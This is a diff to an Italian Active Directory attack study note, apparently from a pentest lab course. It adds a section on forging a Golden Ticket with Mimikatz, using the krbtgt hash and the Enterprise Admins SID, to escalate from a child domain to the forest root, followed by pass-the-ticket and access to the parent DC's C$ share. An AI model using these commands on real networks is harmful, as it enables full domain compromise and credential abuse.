@@ -328,3 +328,12 @@ Execute the task
 
 ## Trust Flow Across Forest
 <img src="Trust_flow_across_forest.png" width="650">
+<img src="Trust_flow_across_forest_1.png" width="650">
+## Da un DC domain possiamo forgiare un TGT (Golden Ticket) per un Enterprise Admins. Passiamo da un Domain Admins ad un Enterprise Admins (riconosciuto perchè il suo SID finisce con 519
+```
+			- powershell -ep bypass
+			- Import-Module Invoke-Mimikatz.ps1
+			- Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:tech.finance.corp /sid:[SID Dominio di partenza] /sids:[SID Domain Enterprise] /krbtgt:[HASH] /ticket:C:\Users\studentuser\Desktop\krbtgt_txt.kirbi"
+			- Invoke-Mimikatz -Command '"kerberos:ptt C:\Users\studentuser\Desktop\krbtgt_txt.kirbi"'
+			- ls \\finance-dc.finance.corp\C$
+```
